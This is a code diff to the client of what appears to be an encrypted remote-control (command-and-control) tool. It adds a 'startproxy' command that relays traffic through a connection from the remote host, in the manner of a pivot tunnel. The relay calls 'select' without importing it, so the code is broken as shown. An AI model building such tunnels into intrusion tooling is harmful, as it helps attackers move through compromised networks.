@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 # from __future__ import unicode_literals
-import socket, sys, json, base64, random, hashlib, signal, threading, time, zlib
+import socket, sys, json, base64, random, hashlib, signal, threading, time, zlib, Queue
 from Crypto.Cipher import AES
 import readline
 
@@ -75,6 +75,51 @@ class Client:
 		files = data_package["data"].split("|")
 		return str(files[state])
 		
+	def socks_proxy(self):
+
+		self.local_proxy_socket = socket.socket()
+		self.local_proxy_socket.bind(("0.0.0.0", 3080))
+		self.local_proxy_socket.listen(5)
+		
+		self.remote_proxy_socket = socket.socket()
+		self.remote_proxy_socket.bind(("0.0.0.0", 4080))
+		self.remote_proxy_socket.listen(5)
+		
+		remote_socket, addr = self.remote_proxy_socket.accept()
+		
+		while True:
+			local_socket, addr = self.local_proxy_socket.accept()
+			
+			while True:
+				try:
+					readable, writable, errored = select.select([local_socket, remote_socket], [], [])
+				except Exception as e:
+					print e
+					break
+				
+				if local_socket in readable:
+					try:
+						local_data = local_socket.recv(4096)
+						if not local_data: break
+						remote_socket.sendall(local_data)
+					except Exception as e:
+						print e
+						break
+				
+				if remote_socket in readable:
+					try:
+						remote_data = remote_socket.recv(4096)
+						if not remote_data: break
+						local_socket.sendall(remote_data)
+					except Exception as e:
+						print e
+						break
+		
+	def create_socks_proxy(self):
+		t = threading.Thread(target=self.socks_proxy)
+		t.daemon = True
+		t.start()
+		
 	def interact(self):
 		print "starting interaction"
 
@@ -92,6 +137,9 @@ class Client:
 			else:
 				try:
 					if not user_input: continue
+					
+					if user_input.startswith("startproxy"):
+						self.create_socks_proxy()
 					self.send(user_input)
 					
 					data = self.recv()
